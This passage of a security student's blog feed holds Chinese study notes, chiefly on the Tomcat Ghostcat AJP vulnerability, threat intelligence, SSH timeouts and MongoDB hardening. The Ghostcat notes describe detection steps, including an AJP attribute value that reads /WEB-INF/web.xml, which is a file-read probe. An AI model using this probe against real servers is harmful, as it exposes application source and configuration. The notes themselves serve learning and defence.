src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200225160914.png"></p><h3 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h3><ul><li>全版本</li><li>默认配置<ul><li>默认启动 AJP Connector，且监听0.0.0.0，外网可访问，且不鉴权</li></ul></li><li>敏感信息泄漏<ul><li>获取源代码、配置文件和资源文件</li><li>只能读WebAPP下的漏洞，不能读根目录下的</li></ul></li><li>代码执行<ul><li>如果存在<strong>文件上传</strong>，可以利用文件包含实现任意代码执行，获取服务器权限</li></ul></li></ul><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><ul><li>X-RAY安全评估工具（社区版）<ul><li><a href="https://xray.cool/" target="_blank" rel="noopener">官网</a></li><li><a href="https://www.anquanke.com/post/id/184204" target="_blank" rel="noopener">链接</a></li></ul></li><li>洞鉴（企业版）</li><li>GhostCat</li></ul><h3 id="如何检测漏洞"><a href="#如何检测漏洞" class="headerlink" title="如何检测漏洞"></a>如何检测漏洞</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200225162726.png"></p><ul><li><p>AJP协议请求一个随机URL，判断版本号</p><ul><li>思考：此处可以不判断status code吗？不可</li></ul></li><li><p>正常访问页面，是否403</p></li><li><p>设置随机属性，看是否为403</p><ul><li>如果2、3步都不是403，则可以设置随机属性，即判断为存在该漏洞</li></ul></li><li><p>尝试去读文件，比较文件特征</p><ul><li>比如常用的就是WEB-INF/web.xml和index.jsp，但文件也有不存在的可能</li><li>设置属性，”javax.servlet.include.servlet_path”:”/WEB-INF/web.xml”</li></ul></li></ul><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h3 id="官方修复方案"><a href="#官方修复方案" class="headerlink" title="官方修复方案"></a>官方修复方案</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200225163447.png"></p><ul><li>默认禁用AJP Connector</li><li>默认监听本地地址</li><li>践行secure by default</li></ul><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200225163555.png"></p><ul><li>默认必须配置secret</li></ul><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200225163625.png"></p><ul><li>用户可以配置所需要的属性白名单，否则直接返回403</li></ul><h3 id="如何升级"><a href="#如何升级" class="headerlink" title="如何升级"></a>如何升级</h3><ul><li><p>如果不使用AJP Connector，可以直接关闭</p></li><li><p>如果需要AJP Connector，但不需要对外暴露AJP Connector</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200225163754.png"></p><p>注意上面的，升级后，升级后secret名字变化</p></li><li><p>如果业务需要设置部分属性，升级后发现403，可以在配置文件中设置白名单</p></li></ul><h3 id="如何防御类似的未知漏洞"><a href="#如何防御类似的未知漏洞" class="headerlink" title="如何防御类似的未知漏洞"></a>如何防御类似的未知漏洞</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200225164122.png"></p><ul><li>做好资产发现、整理和维护</li><li>设置网络防火墙，开放特定端口</li><li>做好安全基线的配置和检查<ul><li>安全基线就是最低的安全要求参照</li><li>e.g. 权限和权利分配，只有管理员有权更改系统文件</li></ul></li></ul><h3 id="长亭的安全产品"><a href="#长亭的安全产品" class="headerlink" title="长亭的安全产品"></a>长亭的安全产品</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200225164327.png"></p><p>可以去参考一下长亭技术产品的特征，功能发展的趋势。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>威胁情报与全流量异常检测案例分析</title>
      <link href="/2020/02/25/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E4%B8%8E%E5%85%A8%E6%B5%81%E9%87%8F%E5%BC%82%E5%B8%B8%E6%A3%80%E6%B5%8B%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/"/>
      <url>/2020/02/25/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E4%B8%8E%E5%85%A8%E6%B5%81%E9%87%8F%E5%BC%82%E5%B8%B8%E6%A3%80%E6%B5%8B%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="威胁情报与全流量异常检测案例分析"><a href="#威胁情报与全流量异常检测案例分析" class="headerlink" title="威胁情报与全流量异常检测案例分析"></a>威胁情报与全流量异常检测案例分析</h1><p>滴滴出行安全说第七期，威胁情报与全流量异常检测案例分析。学习笔记。</p><h2 id="分析APT事件所要具备的能力"><a href="#分析APT事件所要具备的能力" class="headerlink" title="分析APT事件所要具备的能力"></a>分析APT事件所要具备的能力</h2><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><ul><li>使用协议分析工具，独立识别各种通讯协议，对异常流量尝试着手动重组还原。&gt; Wireshark<a href="https://github.com/wireshark/wireshark" target="_blank" rel="noopener">源代码</a>分析</li><li>了解常用工具的通讯加密协议，具有解包还原的能力。</li></ul><h3 id="远控软件和指纹"><a href="#远控软件和指纹" class="headerlink" title="远控软件和指纹"></a>远控软件和指纹</h3><p>熟悉远控软件和各种攻击类软件的指纹。</p><ul><li>木马指纹</li><li>部分常见应用漏洞扫描器的指纹。e.g. Sqlmap</li></ul><h3 id="可疑邮件"><a href="#可疑邮件" class="headerlink" title="可疑邮件"></a>可疑邮件</h3><ul><li>邮件头</li><li>附带的恶意样本的分析</li><li>邮件XSS代码的分析</li><li>邮件恶意Link连接的分析</li></ul><h3 id="恶意样本分析"><a href="#恶意样本分析" class="headerlink" title="恶意样本分析"></a>恶意样本分析</h3><p>取证分析、恶意样本分析。</p><ul><li><p>脱壳</p></li><li><p>植入、反弹域名和各种回传方式的分析</p></li><li><p>自身加密算法的逆向分析</p></li><li><p>对一个木马家族变种的聚类分析</p></li><li><p>对木马控制端的研究</p></li><li><p>对沙箱逃逸技术的检测和分析</p></li><li><p>熟练搭建各种蜜罐系统</p></li></ul><h2 id="安全情报实现威胁检测和响应的闭环"><a href="#安全情报实现威胁检测和响应的闭环" class="headerlink" title="安全情报实现威胁检测和响应的闭环"></a>安全情报实现威胁检测和响应的闭环</h2><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200225005131.png" alt="威胁检测和响应的闭环"></p><p>关于安全研究人员</p><ul><li><p>挖掘、跟踪漏洞，分析攻击数据，组件识别爬虫，输出组件库。</p></li><li><p>分析攻击、捕获跟踪漏洞，并输出研究成果。</p></li></ul><h2 id="DNS安全检测分析"><a href="#DNS安全检测分析" class="headerlink" title="DNS安全检测分析"></a>DNS安全检测分析</h2><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200225010047.png"></p><p>图：模型</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200225010244.png"></p><p>图：10大检测</p><ul><li><p>检测模型</p></li><li><p>10大检测方向</p></li><li><p>分析主机信誉值</p></li></ul><h3 id="流量分析实例"><a href="#流量分析实例" class="headerlink" title="流量分析实例"></a>流量分析实例</h3><ol><li>利用structs2-045进行RCE的完整攻击路线，挖矿流量</li><li>菜刀webshell流量，分析攻击路径，攻击者行为</li><li>Linux门罗币挖矿。如何绕过杀软？隐藏在图片中的shell脚本，通过dd分离</li><li>国内Windows DDoS客户端案例</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 威胁情报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漫漫安全路</title>
      <link href="/2020/02/24/%E6%BC%AB%E6%BC%AB%E5%AE%89%E5%85%A8%E8%B7%AF/"/>
      <url>/2020/02/24/%E6%BC%AB%E6%BC%AB%E5%AE%89%E5%85%A8%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="漫漫安全路"><a href="#漫漫安全路" class="headerlink" title="漫漫安全路"></a>漫漫安全路</h1><p>今天在学长提到后，去看了一篇文章。</p><blockquote><p>最近有一些朋友找到我，跟我聊，说自己感觉很迷茫，不知所措，不知道未来该怎么办？安全该怎么做？OKR该怎么写？</p><p>其实我想反问他以下几个问题：</p><p>1.漏洞研究了几个？</p><p>2.样本分析了几个？</p><p>3.这段时间看了多少安全技术类文档？</p><p>4.目前流行的恶意样本家族都有哪些？</p><p>5.目当流行的影响重大漏洞都有哪些？</p><p>6.经典流行的样本和漏洞，你都亲自动手分析调试过吗？</p><p>7.全球流行的黑客组织都有哪些？这些组织都使用了哪些攻击样本？这些样本都利用了哪些漏洞？你了解总结过吗？</p><p>8.这些流行的样本和漏洞，你们公司的产品都做了哪些防护，是否都能检测与防护了?</p><p>9.国内外最新的一些安全事件的样本和漏洞都有研究吗?</p><p>这些你都做了多少，做了哪些？这些都是可以研究的方向和点，为什么会没有事情做呢?又为什么会有时间迷茫呢？你每天的时间都在做什么?每天花了多少时间是在安全研究以及安全相关的事情上？你做了哪些安全方向的总结与规划?</p><p>来自 <a href="https://mp.weixin.qq.com/s/S9XfbG5YFWSCtHDScFLVtg" target="_blank" rel="noopener">《安全的路很长，致迷茫的你》</a></p></blockquote><p>精简一下，就是以下的几点。这些都可以是自己的研究方向。可以是自己的安全技能，只有不断学习、锻炼，才能获得技能点，提升自己！想想清楚吧，其实没有多少时间迷茫了，迷茫着迷茫着，人生就过去了。同样地，挑战着、坚持着，到最后就是“蓦然回首”。一句话，坚持就是胜利，奥力给！</p><ul><li>漏洞研究</li><li>样本分析</li><li>安全类技术文档</li><li>目前流行的恶意样本家族</li><li>目前流行的重大漏洞</li><li>动手分析和调试经典的样本和漏洞</li><li>了解全球黑客组织使用的攻击样本、技术</li><li>如何面向这些攻击样本和漏洞做检测和防护</li><li>研究国内外的安全事件所用的样本和漏洞</li></ul><blockquote><p>这些你都做了多少，做了哪些？</p><p>这些都是可以研究的方向和点，为什么会没有事情做呢?</p><p>又为什么会有时间迷茫呢？</p><p>你每天的时间都在做什么?</p><p>每天花了多少时间是在安全研究以及安全相关的事情上？</p><p>你做了哪些安全方向的总结与规划?</p></blockquote><p>多反思一下。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全之路 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>被动扫描器与主动的区别</title>
      <link href="/2020/02/24/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F%E5%99%A8%E4%B8%8E%E4%B8%BB%E5%8A%A8%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2020/02/24/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F%E5%99%A8%E4%B8%8E%E4%B8%BB%E5%8A%A8%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="被动漏洞扫描器与主动的区别"><a href="#被动漏洞扫描器与主动的区别" class="headerlink" title="被动漏洞扫描器与主动的区别"></a>被动漏洞扫描器与主动的区别</h1><blockquote><p>扫描器： 取接口+针对接口发POC  主动的和被动的就取接口方式不同，主动的为通过爬虫来取接口，被动的为通过代理或流量来取接口</p><p>来自吐司回答</p></blockquote><p>Web漏洞扫描器的主要流程可以分为三步</p><ul><li>页面/接口爬取</li><li>探测点发现</li><li>漏洞检测</li></ul><p>被动扫描器与主动扫描器（常见）的主要区别在于页面爬取这个阶段。主动扫描器直接使用爬虫暴力探测接口，而被动扫描器则采用获取流量的方式探测接口。之后的步骤大致相同，具体可参考<a href="https://cloud.tencent.com/developer/news/175423" target="_blank" rel="noopener">该文章</a>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux中的open命令</title>
      <link href="/2020/02/23/Linux%E4%B8%AD%E7%9A%84open%E5%91%BD%E4%BB%A4/"/>
      <url>/2020/02/23/Linux%E4%B8%AD%E7%9A%84open%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux中的open命令"><a href="#Linux中的open命令" class="headerlink" title="Linux中的open命令"></a>Linux中的open命令</h1><p>在macOS中常用<code>open </code>命令，在终端直接用系统默认的应用程序打开相关文件，从而实现一个简单的，终端到可视化界面的切换。在Linux中其实也有类似的命令，为<code>xdg-open</code>。使用方式和功能与macOS中类似。</p><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><ul><li><p>打开文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xdg-open ./xxx</span><br></pre></td></tr></table></figure></li><li><p>打开文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xdg-open .</span><br></pre></td></tr></table></figure></li><li><p>打开URL（使用系统默认的应用软件打开，比如Firfox）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xdg-open www.bing.com</span><br></pre></td></tr></table></figure></li><li><p>SFPT连接远程服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ open ssh://root@xxx.xx.xxx.xx</span><br></pre></td></tr></table></figure><p>注：SFTP 是一个独立的 SSH 封装协议包，通过安全连接，同FTP类似的方式工作。</p></li></ul><h2 id="添加别名"><a href="#添加别名" class="headerlink" title="添加别名"></a>添加别名</h2><p><code>xdg-open</code>这个命令打起来比较费力，我们可以直接在终端配置文件中给它添加别名为<code>open</code>或者其它你觉得适合的。具体修改的配置文件要根据你使用的终端工具而定。例如<code>.bashrc</code>文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ vim .bashrc</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment"># 添加下面一行到文件中任意位置，推荐在文件的头尾</span></span><br><span class="line">  <span class="built_in">alias</span> <span class="string">'open'</span>=<span class="string">'xdg-open'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于SSH超时断开的安全性考虑</title>
      <link href="/2020/02/22/%E5%85%B3%E4%BA%8ESSH%E8%B6%85%E6%97%B6%E6%96%AD%E5%BC%80%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E8%80%83%E8%99%91/"/>
      <url>/2020/02/22/%E5%85%B3%E4%BA%8ESSH%E8%B6%85%E6%97%B6%E6%96%AD%E5%BC%80%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E8%80%83%E8%99%91/</url>
      
        <content type="html"><![CDATA[<h1 id="关于ssh超时断开的安全性考虑"><a href="#关于ssh超时断开的安全性考虑" class="headerlink" title="关于ssh超时断开的安全性考虑"></a>关于ssh超时断开的安全性考虑</h1><p>在做红蓝攻防，连接上服务器后，发现该资产服务器ssh连接长时间闲置不断开，这和平常用的云服务器不太一样。去了解了一下原因，主要是防火墙的原因。</p><blockquote><p>通过ssh连接后，客户端和服务端长时间没响应时，在两方机器设置中均没任何限制，但在各自的防火墙，或是中转网络连接路由的防火墙中，出现了「闲置超时断开」的缺省机制！</p><p><a href="http://bluebiu.com/blog/linux-ssh-session-alive.html" target="_blank" rel="noopener">http://bluebiu.com/blog/linux-ssh-session-alive.html</a></p></blockquote><p>要设置SSH超时断开时间，有以下的几种方法</p><h2 id="方法一：修改服务器配置"><a href="#方法一：修改服务器配置" class="headerlink" title="方法一：修改服务器配置"></a>方法一：修改服务器配置</h2><p>修改<code>/etc/ssh/sshd_config</code> 文件</p><ul><li><p><code>TCPKeepAlive yes</code>  表示TCP保持连接不断开。默认关闭。表示默认状态下，不启用人为修改的连接空闲时长。如果我们想人为设置，使得后面的参数修改生效，则必须开启该选项，去除注释。</p></li><li><p><code>ClientAliveInterval</code>参数，指定服务端向客户端请求消息的时间间隔，单位是秒，默认是0，不发送。例如，设置300表示5分钟发送一次（注意，这里是服务端主动发起），然后等待客户端响应，成功，则保持连接</p></li><li><p><code>ClientAliveCountMax</code>参数，设置允许超时的次数。指服务端发出请求后客户端无响应则自动断开的最大次数。和前一个参数的乘积，即为最长保持连接的时间。</p></li><li><p>重启sshd服务，使修改生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /etc/init.d/ssh restart</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ service sshd reload</span><br></pre></td></tr></table></figure></li></ul><p>简单地来说，TCP中的<code>KeepAlive</code>机制通过定时发送探测包，来探测连接的对端是否存活。我们可以利用该机制，从服务端角度设置连接最大时长。  </p><h2 id="方法二：修改客户端和工具配置"><a href="#方法二：修改客户端和工具配置" class="headerlink" title="方法二：修改客户端和工具配置"></a>方法二：修改客户端和工具配置</h2><p>从方法一可以知道，“闲置超时断开”主要是通过发送TCP探测包实现的。因此，也可以从客户端的角度出发，客户端保持对服务器的请求，即可保持来连接。有以下的几种方法。</p><ul><li><p>修改客户端主机配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ vim ~/.ssh/config</span><br><span class="line">  ...</span><br><span class="line">  Host *</span><br><span class="line">    ServerAliveInterval 60</span><br><span class="line">    ServerAliveCountMax 3</span><br></pre></td></tr></table></figure><p><code>Host *</code>  表示需要启用该规则的服务端（域名或IP）<br><code>ServerAliveInterval 60</code>  表示没60秒去给服务端发起一次请求消息<br><code>ServerAliveCountMax 3</code>   表示最大连续尝试连接次数（一般不用设置）</p></li></ul><ul><li><p>修改SSH工具的配置</p><p>开启工具的KeepAlive选项。  </p></li></ul><ul><li><p>设置SSH命令连接参数</p><p>设置 -o 参数，设置与服务器的交互时间，多少时间给服务端发起一次请求。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -o ServerAliveInterval=30 user@host</span><br></pre></td></tr></table></figure></li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>相对来说，设置SSH超时断开，可以减少服务器资源的占用，并且一定程度上提高服务器安全性。但如果是出于使用的角度，不考虑前面提到的内容，则建议修改客户端和连接工具的配置。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] Linux使用ssh超时断开连接的真正原因, <a href="http://bluebiu.com/blog/linux-ssh-session-alive.html" target="_blank" rel="noopener">http://bluebiu.com/blog/linux-ssh-session-alive.html</a>  </p><p>本文主要参考该博客文章，并加上了该操作对安全性的考虑。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>物联网导论</title>
      <link href="/2020/02/18/%E7%89%A9%E8%81%94%E7%BD%91%E5%AF%BC%E8%AE%BA/"/>
      <url>/2020/02/18/%E7%89%A9%E8%81%94%E7%BD%91%E5%AF%BC%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="物联网导论"><a href="#物联网导论" class="headerlink" title="物联网导论"></a>物联网导论</h1><p>Practice yourself, for heaven’s sake, in little things; and thence proceed to greater.</p><h2 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h2><h3 id="Data-intensive-computing"><a href="#Data-intensive-computing" class="headerlink" title="Data-intensive computing"></a>Data-intensive computing</h3><ul><li>Vast amounts of <strong>data</strong> becoming avaliable.</li><li>The <strong>infrastructures</strong> allowing to persistently store these date for sharing and processing. </li></ul><h3 id="Need-to-Unify-the-Knowledge"><a href="#Need-to-Unify-the-Knowledge" class="headerlink" title="Need to Unify the Knowledge"></a>Need to Unify the Knowledge</h3><ul><li>Theories</li><li>Experiments</li><li>Simulations</li></ul><h3 id="Big-Data"><a href="#Big-Data" class="headerlink" title="Big Data"></a>Big Data</h3><h3 id="The-Combination"><a href="#The-Combination" class="headerlink" title="The Combination"></a>The Combination</h3><p>The combination of the internet and emerging technologies transform everyday objects into *<em>smart objects capable to understand and react /to their environment. *</em></p><ul><li>Near-field communications<ul><li>近场通讯（NFC）</li></ul></li><li>Real-time Localization<ul><li>实时定位</li></ul></li><li>Embedded Sensors<ul><li>嵌入式传感器</li></ul></li></ul><h3 id="Several-Important-Research-Questions"><a href="#Several-Important-Research-Questions" class="headerlink" title="Several Important Research Questions"></a>Several Important Research Questions</h3><ul><li><p>System Architecture</p><ul><li>Who does work and how it connect ? </li><li>The right balance for the distribution of functionality between smart objects and the supporting infrastructure.</li><li>Cloud Computing and Big Data become true infrastructure enablers（基础设施推动者） for IoT.</li><li><strong>Cloud computing, big data, mobility , IoT</strong></li><li>The four areas creates a new “Platform”</li></ul></li><li><p>Design and development</p></li><li><p>Human involvement（人类的参与）</p></li></ul><h2 id="IoT-concepts-and-Arguments"><a href="#IoT-concepts-and-Arguments" class="headerlink" title="IoT concepts and Arguments"></a>IoT concepts and Arguments</h2><h3 id="History"><a href="#History" class="headerlink" title="History"></a>History</h3><p>If you want to know this field deeply, yo ushoule konw the history of this area well.</p><ul><li><p>1995, The Road Ahead, Bill Gates，《未来之路》</p></li><li><p>2005, ITU</p></li><li><p>2008, IBM “Smart Earth”</p></li><li><p>2009, “Sensing China”</p></li></ul><h3 id="IoT-Historical-Process"><a href="#IoT-Historical-Process" class="headerlink" title="IoT Historical Process"></a>IoT Historical Process</h3><ul><li>The main clue of development is complicated, the origin is not simple and single</li><li>RFID(<strong>R</strong>adio <strong>F</strong>requency <strong>ID</strong>entification), 是一种无线通信技术，可以通过无线电信号识别特定目标并读写相关数据.</li><li>Pervasive Computing（普适计算）, Mark Wiser.<ul><li>Perception(感知) and Internet</li><li><strong>普适计算</strong>是一个强调和环境融为一体的<strong>计算</strong>概念，而<strong>计算机本身则从人们的视线里消失</strong>。 在<strong>普适计算</strong>的模式下，人们能够在任何时间、任何地点、以任何方式进行信息的获取与处理。 </li><li><strong>普适计算</strong>是一个涉及研究范围很广的课题，包括分布式<strong>计算</strong>、移动<strong>计算</strong>、人机交互、人工智能、嵌入式系统、感知网络以及信息融合等多方面技术的融合。</li><li>“The most profound technologies are those that disappear.”</li><li>传感器、芯片做得越来越小，人们在感受到这些电子器件所带来的服务时，是感受不到这种计算的本身的。</li></ul></li><li>Embedded Systems<ul><li>The late 1990s, the sensor network started.</li><li>In 2006, NSF workshop on CPS(Cyber-Physical Systems) Infromation - Physical Fushion Sytem.</li></ul></li></ul><h3 id="What-is-IoT"><a href="#What-is-IoT" class="headerlink" title="What is IoT?"></a>What is IoT?</h3><ul><li><p>One defination of IoT</p><ul><li><p>In computing, the internet of Things refers to <strong>a network of objects</strong>.</p></li><li><p>It’s often a <strong>self-configuring</strong> wireless network. </p><ul><li>Q: What’s self-configuring?  A: Autonomous configuration of network parameters in order for a network to become operable. </li></ul></li><li><p>Three important feature（）</p><ul><li>Equip the common objects（普通对象的设备化）<ul><li>比如，普通的设备加入传感器</li><li>服务的舒适性、安全性</li></ul></li><li>Connect the autonomous terminals（服务终端的自动化）<ul><li>采集数据、分发数据</li></ul></li><li>Smarten Pervasive service（普适服务的智能化）</li></ul></li><li><p>The different between telecom and internet</p><ul><li><p>Telecom service providers offer voice calling and text messaging directly, while internet services run on the top layer of the network as standalone services. </p></li><li><p>The services are offered in a different context, even if they sometimes serve the same function for end users.</p></li><li><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200225105947.png"></p></li><li><p>Internet 除去传输声音和信息外，还需要传输数据。Telecom有更高的传输速度。</p></li></ul></li><li><p>扩展：自组网用于IoT？</p><ul><li>自由网（ad hoc network/mesh network）,peer-to-peer，点对点、去中心化且匿名。</li><li>e.g. <a href="https://freenetproject.org/" target="_blank" rel="noopener">FreeNet</a></li><li>现在还没有足够的算法能够使得大面积的通过自组网技术的数据传输成本降低，但未来或许可以。</li></ul></li></ul></li><li><p>Other definitions</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB加固策略</title>
      <link href="/2020/02/17/MongoDB%E5%8A%A0%E5%9B%BA%E7%AD%96%E7%95%A5/"/>
      <url>/2020/02/17/MongoDB%E5%8A%A0%E5%9B%BA%E7%AD%96%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB加固策略"><a href="#MongoDB加固策略" class="headerlink" title="MongoDB加固策略"></a>MongoDB加固策略</h1><h2 id="防火墙端口"><a href="#防火墙端口" class="headerlink" title="防火墙端口"></a>防火墙端口</h2><p>MongoDB的默认监听端口为<code>27017</code>，且启动时默认不需要认证。因此，如果是架设在云端的MongoDB服务，在不需要远程连接进行管理的情况下，可以直接在防火墙规则里关闭该默认端口。</p><h2 id="版本升级"><a href="#版本升级" class="headerlink" title="版本升级"></a>版本升级</h2><p>3.0版本以前的MongoDB有较大的安全隐患，如存在一个包含服务器配置层面操作的<code>admin</code>数据库。因此，不建议使用3.0及以前版本。</p><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><blockquote><p>参考：<a href="https://www.jianshu.com/p/5f60db122f7f" target="_blank" rel="noopener">https://www.jianshu.com/p/5f60db122f7f</a></p><p>《Mongodb 权限管理》</p></blockquote><h2 id="启用权限认证"><a href="#启用权限认证" class="headerlink" title="启用权限认证"></a>启用权限认证</h2><ol><li><p>修改<code>/etc/mongodb.conf</code>，取消注释<code>auth = true</code>或<code>authorization: enable</code>。</p></li><li><p>重新启动MongoDB</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service mongod restart</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 安全运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全威胁情报简述</title>
      <link href="/2020/02/13/%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E7%AE%80%E8%BF%B0/"/>
      <url>/2020/02/13/%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E7%AE%80%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="安全威胁情报简述"><a href="#安全威胁情报简述" class="headerlink" title="安全威胁情报简述"></a>安全威胁情报简述</h1><p>该篇文章内容主要来自<a href="https://www.bugbank.cn/" target="_blank" rel="noopener">漏洞银行</a>的公开课，主讲人是g3on。此篇是自己学习情报工作时，对于安全相关方向的记录，希望与你分享。</p><h2 id="安全威胁情报简述-1"><a href="#安全威胁情报简述-1" class="headerlink" title="安全威胁情报简述"></a>安全威胁情报简述</h2><h3 id="什么是安全情报？"><a href="#什么是安全情报？" class="headerlink" title="什么是安全情报？"></a>什么是安全情报？</h3><p>可以分为：资产情报、事件情报、漏洞情报和威胁情报。</p><p>注意，我们常说的威胁情报，并不完全等同于安全情报。</p><p>四大类信息[2]</p><ul><li><p>资产情报：主要用于确认企业自身的资产</p><p>e.g. 企业自身的数据SOC、SIEM数据日志、告警等。</p></li><li><p>事件情报：对于已经发生的安全事件的报道</p></li><li><p>漏洞情报：软硬件各种已知或未知的漏洞的情报</p><p>e.g. cve, nday</p></li><li><p>威胁情报：</p><p>OSINT（Open source intelligence ，公开资源情报）; 未公开数据（黑产群、社区等）。</p></li></ul><hr><ul><li>资产情报如何搜集？<ul><li>主要来自于企业的SOC( Security Operation Center), SIEM(Security Information and Event Management)数据</li><li>网络日志等</li><li>告警信息</li></ul></li></ul><h3 id="什么是攻击源画像？"><a href="#什么是攻击源画像？" class="headerlink" title="什么是攻击源画像？"></a>什么是攻击源画像？</h3><p>画像：根据用户社会属性、生活习惯和消费行为等信息而抽象出的一个<strong>标签化</strong>的用户模型。</p><p>攻击源画像：描述攻击源的基础设施、技术风格、惯用手法等标识。</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200211091125.png"></p><h3 id="什么是安全威胁情报？"><a href="#什么是安全威胁情报？" class="headerlink" title="什么是安全威胁情报？"></a>什么是安全威胁情报？</h3><p>SANS：针对安全威胁、威胁者、利用、恶意软件、漏洞和危害指标、所收集的用于评估的应用<strong>数据集</strong>。  </p><p>iSight：网络威胁情报是关于已收集、分析、分发的，<strong>针对攻击者和其动机</strong>的目的手段，用于帮助所有安全级别的，和业务员工的，用于<strong>保护企业核心资产</strong>的知识。</p><p>总的来说：</p><p>威胁数据——&gt; SIEM（安全信息与事件管理）——&gt;安全保障</p><h3 id="常见误区"><a href="#常见误区" class="headerlink" title="常见误区"></a>常见误区</h3><p>1.漏洞情报就是威胁情报。威胁企业的，漏洞只是一部分。漏洞知己，威胁知彼。</p><p>2.威胁信息=威胁情报。 威胁情报，不仅是收集，还需要分析。情报是已经处理和分析的。</p><p>3.威胁情报就是信息收集。信息收集只是威胁情报的第一部分。情报是对企业有意义的。</p><h2 id="安全威胁情报的现今发展"><a href="#安全威胁情报的现今发展" class="headerlink" title="安全威胁情报的现今发展"></a>安全威胁情报的现今发展</h2><h3 id="情报体系"><a href="#情报体系" class="headerlink" title="情报体系"></a>情报体系</h3><p>行业标准：CybOX, STIX和TAXII等[3]，《网络安全威胁信息格式规范》。</p><p>常规做法：渗透黑客、诈骗犯社区、漏洞平台、漏洞库、安全社区、针对性漏洞、代码研究</p><p>国内厂商：微步在线、360威胁情报中心、X-Force Exchange（IBM的一个威胁情报平台，<a href="https://exchange.xforce.ibmcloud.com/" target="_blank" rel="noopener">链接</a>）、<a href="https://nosec.org/home/index" target="_blank" 